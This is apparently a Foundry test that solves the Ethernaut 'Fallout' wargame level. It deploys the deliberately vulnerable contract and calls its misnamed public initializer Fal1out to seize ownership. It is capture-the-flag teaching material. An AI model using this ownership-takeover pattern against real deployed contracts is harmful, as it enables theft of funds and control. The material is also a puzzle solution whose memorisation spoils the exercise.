// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";

/// @notice Minimal ABI used by the modern test harness to interact with the Solidity 0.6 target.
interface IFallout {
    /// @notice Calls the vulnerable public initializer.
    function Fal1out() external payable;

    /// @notice Returns the owner currently stored by the target.
    function owner() external view returns (address);
}

/// @title Ethernaut 02 - Fallout Solution Test
/// @notice Verifies that any caller can invoke Fal1out and take ownership.
contract FalloutTest is Test {
    /// @notice Account used to solve the level.
    address player = makeAddr("player");

    /// @notice Interface for the deployed Solidity 0.6 target.
    IFallout target;

    /// @notice Deploys the legacy artifact and funds the player before each test.
    /// @dev deployCode keeps the vulnerable source on Solidity 0.6 while this test uses modern forge-std.
    function setUp() public {
        target = IFallout(deployCode("02_Fallout.sol:Fallout"));
        vm.deal(player, 1 ether);
    }

    /// @notice Completes the level through the publicly callable Fal1out function.
    function testSolve() public {
        vm.startPrank(player);

        // Call the function that was intended to initialize the contract owner.
        target.Fal1out{value: 1 wei}();

        // Confirm that the unrestricted call assigned ownership to the player.
        assertEq(target.owner(), player);

        vm.stopPrank();
    }
}
